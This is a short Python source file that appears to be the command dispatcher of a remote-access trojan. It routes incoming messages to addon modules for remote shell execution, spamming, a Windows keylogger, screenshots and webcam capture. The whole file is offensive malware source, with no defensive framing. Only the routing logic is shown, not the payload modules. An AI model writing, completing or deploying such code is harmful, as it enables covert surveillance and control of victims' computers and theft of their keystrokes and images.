import addons


def distribute(messageSent):
	if messageSent.find ( 'cmd' ) != -1:
		return addons.shell.shell(messageSent.split('->')[1])
	elif messageSent.find ( 'spam' ) != -1:
		return addons.spam.spam(messageSent.split('->')[1].split('-')[0],messageSent.split('->')[1].split('-')[1])
	elif messageSent.find ( 'keylogger' ) != -1:
		return addons.keylogger.keylogger_win(messageSent.split('->')[1])
	elif messageSent.find("screenshot") != -1:
		return addons.screenshot.screenshot()
	elif messageSent.find("webcam") != -1:
		return addons.webcam.webcam()
	else:
		return "404 - Request not found"
	